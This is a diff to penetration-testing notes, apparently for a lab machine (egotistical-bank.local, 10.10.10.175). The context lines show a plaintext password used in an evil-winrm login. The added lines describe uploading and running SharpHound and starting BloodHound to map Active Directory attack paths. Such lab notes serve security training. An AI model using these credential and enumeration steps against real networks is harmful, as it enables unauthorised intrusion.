@@ -25,3 +25,13 @@ Thestrokes23 for fsmith@egotistical-bank.local
 ```
 evil-winrm -i 10.10.10.175 -p Thestrokes23 
 ```
+- Going to run a bloodhound collection to see where to go next
+- uploading sharphound with evil-winrm then running with 
+```
+.\SharpHound.exe -c all
+```
+- Downloading the output to notes and uploading to git
+- Running bloodhound for analysis by navigating to the folder with the docker-compose image for bloodhound and running 
+```
+docker-compose up
+```
